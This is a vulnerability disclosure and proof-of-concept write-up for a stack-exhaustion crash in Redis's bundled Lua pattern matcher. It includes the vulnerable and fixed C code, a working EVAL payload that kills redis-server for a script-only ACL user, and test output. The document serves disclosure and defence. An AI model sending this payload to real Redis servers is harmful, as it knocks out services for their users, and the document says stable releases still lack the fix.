# LuaRabbit — Redis Lua pattern-recursion stack exhaustion

`string.find` / `string.match` with a pattern built from many `.?` items recurse once per
input character inside Lua's `match()` (deps/lua/src/lstrlib.c). A ~1 MiB subject and a
~1 MiB pattern (`2^20` copies of `.?`) recurse a million frames deep, overflow the C stack,
and kill the `redis-server` process — a remote denial of service for any client allowed to
run Lua scripts (EVAL/EVALSHA), including an ACL-restricted user that is denied every
administrative command.

| | |
|---|---|
| **Product / version** | Redis unstable (all versions shipping the bundled Lua 5.1 `lstrlib.c` without a depth limit; bundled Lua in every Redis up to the fix) |
| **CVSS** | 6.5 MEDIUM — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (PR:L = any client with EVAL/EVALSHA scripting permission; the bundled Lua is reachable only through the scripting engine) |
| **CWE** | CWE-674 Uncontrolled Recursion (stack exhaustion) |

Fix: [`124bc7e`](https://github.com/redis/redis/commit/124bc7ef45e2baa63afbec3a956fb6c41358c450)
("Fix lua pattern match depth too big", 2026-11-09) — ports the upstream Lua `MAXCCALLS`
depth limit into `deps/lua/src/lstrlib.c`. It is on `unstable` and landed in the release
candidate `8.12-rc3` (2026-11-12), but **no stable release carries it yet** — `8.10.3`,
`8.4.4`, `8.0.6` and `7.4.12` were checked and still lack `matchdepth`. No CVE/GHSA has
been assigned.

## The bug

```c
/* deps/lua/src/lstrlib.c — before 124bc7e */
static const char *match (MatchState *ms, const char *s, const char *p) {
  ...
  case L_CSETS + ...:  /* and the single-char class case below */
      ...
      return match(ms, s + 1, p + 2);   /* one C frame per input char, unbounded */
```

Each `.?` in the pattern is a single-character class that recurses into `match()` for the
next character. With `string.rep(".?", 2^20)` over `string.rep("a", 2^20)`, the recursion is
~1,048,576 frames — far past the 8 MiB thread stack — and the process takes SIGSEGV.

```c
/* deps/lua/src/lstrlib.c:398-405 — after 124bc7e */
static const char *match (MatchState *ms, const char *s, const char *p) {
  if (ms->matchdepth-- == 0)
    luaL_error(ms->L, "pattern too complex");   /* MAXCCALLS = 200 */
```

## The PoC

`poc.py` builds nothing itself — it starts the **real `redis-server`** built from source at
the vulnerable commit and at the fixed commit, creates an ACL user allowed only to run
scripts (`ACL SETUSER luauser on >luapw ~* +eval +ping`), authenticates as that user,
shows that `SHUTDOWN NOSAVE` is refused (`-NOPERM`), and then sends:

```
EVAL "return string.find(string.rep('a', 2^20), string.rep('.?', 2^20))" 0
```

and checks the server process:

```console
$ bash run.sh
== vulnerable redis (parent of 124bc7e) ==
[vuln] PING -> b'+PONG\r\n'
[vuln] ACL SETUSER luauser on >luapw ~* +eval +ping -> b'+OK\r\n'
[vuln] luauser AUTH -> b'+OK\r\n'
[vuln] luauser SHUTDOWN NOSAVE -> b"-NOPERM User luauser has no permissions to run the 'shutdown' command\r\n"
[vuln] luauser EVAL reply: b''
[vuln] server DEAD after EVAL: SIGSEGV

== fixed redis (124bc7e, Lua MAXCCALLS=200) ==
[fixed] PING -> b'+PONG\r\n'
[fixed] luauser SHUTDOWN NOSAVE -> b"-NOPERM ..."
[fixed] luauser EVAL reply: b'-ERR user_script:1: pattern too complex ...'
[fixed] server ALIVE after EVAL

MARKER: LUARABBIT-CONFIRMED — ...
```

`run.sh` downloads the two commits' source tarballs from codeload.github.com and builds
`redis-server` with the musl cross-compiler (`zig`/`gcc` fallback), then runs the driver.
The prebuilt binaries in `bin/` are gitignored; delete them to force a rebuild.

## Exploitability assessment (honest)

- **Proven:** the real Redis process dies with SIGSEGV on the crafted `EVAL`; the fixed build
  returns a Lua error and stays up. Deterministic, no race, no memory corruption required.
  The crash is sent as an ACL user restricted to `+eval +ping`, whose `SHUTDOWN NOSAVE` is
  rejected with `-NOPERM` — so the DoS crosses a real privilege boundary rather than relying
  on a client that is already admin-equivalent.
- **Preconditions:** the attacker can run a Lua script on the server, i.e. holds an ACL user
  with `EVAL`/`EVALSHA`/`FUNCTION` (the `@scripting` category) but *not* the administrative
  `@dangerous` commands. In a default no-auth Redis reachable from the network that is every
  client (score would then be `PR:N`, 7.5); the PoC uses the narrower ACL-confined case, which
  is why `PR:L` is claimed.
- **Impact:** process crash = availability loss for the whole Redis instance (all databases
  on that server). No code execution, no data disclosure, no ACL escape — the script itself
  runs inside the sandbox; only the C stack is exhausted.
- **Mitigations:** ACL rules denying `EVAL`/`EVALSHA`/`FUNCTION` to untrusted clients;
  the patch itself (Lua `MAXCCALLS`).

## References

- Fix commit: <https://github.com/redis/redis/commit/124bc7ef45e2baa63afbec3a956fb6c41358c450>
- PR: <https://github.com/redis/redis/pull/16203>
